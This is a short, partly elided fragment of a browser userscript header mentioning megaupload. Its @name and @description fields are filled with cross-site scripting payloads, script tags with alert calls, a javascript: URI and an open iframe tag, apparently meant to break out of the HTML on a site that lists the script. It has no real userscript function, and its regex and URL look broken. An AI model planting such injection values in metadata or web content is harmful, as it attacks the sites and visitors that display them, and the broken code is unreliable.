// ==UserScript==
// @name           "><script>alert("XSSED BY THE SCRIPT OF UPLOAD, JAVASCRIPT ROXX !!!")</script>javascript:alert("XSSED BY THE SCRIPT OF UPLOAD, JAVASCRIPT ROXX !!!")<iframe src=
// @description    "><script>alert("XSSED BY THE SCRIPT OF UPLOAD, JAVASCRIPT ROXX !!!")</script>
...
// @exclude        http://wwww.megaupload.com/fr/*
...
var mymegauploadRegExp = /http\:\/\/www\.megaupload\fr\.com\/\?d=.{8}(\/|)/;
